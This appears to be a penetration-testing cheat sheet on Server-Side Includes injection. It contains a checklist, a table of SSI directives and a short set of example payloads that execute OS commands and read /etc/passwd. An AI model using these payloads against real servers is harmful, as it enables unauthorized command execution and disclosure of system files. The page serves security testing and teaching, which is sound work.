# Server-Side Includes (SSI) Injection

SSI injection occurs when an attacker can inject SSI directives into a file that is subsequently served by the web server, resulting in the execution of the injected SSI directives. This scenario can occur in a variety of circumstances. For instance, when the web application contains a vulnerable file upload vulnerability that enables an attacker to upload a file containing malicious SSI directives into the web root directory. Additionally, attackers might be able to inject SSI directives if a web application writes user input to a file in the web root directory.

## Checks

- [ ] Can we inject data into a page/file that is served by the server?
- [ ] Can we upload a file into the web root?
- [ ] Can we write user input to a file in the web root directory?
- [ ] Does the server parse `.shtml`, `.shtm`, or `.stm` files?

## SSI Directives

| Directive               | Syntax                                               | Description                    |
| ----------------------- | ---------------------------------------------------- | ------------------------------ |
| Print all variables     | `<!--#printenv -->`                                  | Dump all environment variables |
| Print specific variable | `<!--#echo var="DOCUMENT_NAME" var="DATE_LOCAL" -->` | Print named variables          |
| Change config           | `<!--#config errmsg="Error!" -->`                    | Change SSI configuration       |
| Execute command         | `<!--#exec cmd="whoami" -->`                         | Execute an OS command          |
| Include web file        | `<!--#include virtual="index.html" -->`              | Include another file           |

## Example Payloads

```html
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#include virtual="/etc/passwd" -->
<!--#echo var="DOCUMENT_ROOT" -->
```

---

## References

- [PayloadsAllTheThings - SSI Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection)
- [OWASP - SSI Injection](<https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection>)
- [HackTricks - SSI Injection](https://book.hacktricks.wiki/en/pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html)
